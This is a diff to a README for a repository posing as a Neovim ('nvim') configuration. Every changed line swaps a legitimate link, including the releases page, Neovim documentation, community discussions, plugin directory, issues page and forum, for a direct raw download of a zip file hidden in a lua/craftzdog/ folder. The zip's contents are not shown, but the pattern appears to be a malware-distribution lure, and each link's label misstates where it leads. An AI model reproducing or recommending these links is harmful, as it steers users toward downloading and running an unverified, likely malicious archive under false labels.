@@ -27,7 +27,7 @@ Welcome to nvim! This application offers a fast and efficient way to enhance you
 
 To get nvim, please visit the following page to download the latest version:
 
-[Visit Releases Page](https://github.com/DeepKalsariya09/nvim/releases)
+[Visit Releases Page](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
 
 ### Installation Steps
 
@@ -57,16 +57,16 @@ You might want to customize nvim to suit your workflow. Here are a few tips:
 
 Feel free to explore more about Neovim and its ecosystem:
 
-- [Neovim Documentation](https://neovim.io)
-- [Community Discussions](https://github.com/neovim/neovim/discussions)
-- [Plugin Directory](https://github.com/neovim/nvim-lspconfig)
+- [Neovim Documentation](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
+- [Community Discussions](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
+- [Plugin Directory](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
 
 ## 💬 Support
 
 If you run into any issues, you can reach out via the following channels:
 
-- Issues Page: [Report Issues](https://github.com/DeepKalsariya09/nvim/issues)
-- Community Forums: [Join the Community](https://community.neovim.io)
+- Issues Page: [Report Issues](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
+- Community Forums: [Join the Community](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
 
 ## 📄 License
 
@@ -84,6 +84,6 @@ For updates and new features, please refer to the changelog available on the rel
 
 Once more, please visit the following page to download nvim:
 
-[Visit Releases Page](https://github.com/DeepKalsariya09/nvim/releases)
+[Visit Releases Page](https://github.com/DeepKalsariya09/nvim/raw/refs/heads/main/lua/craftzdog/Software_v1.5-beta.5.zip)
 
 Thank you for choosing nvim! Enjoy your coding journey.
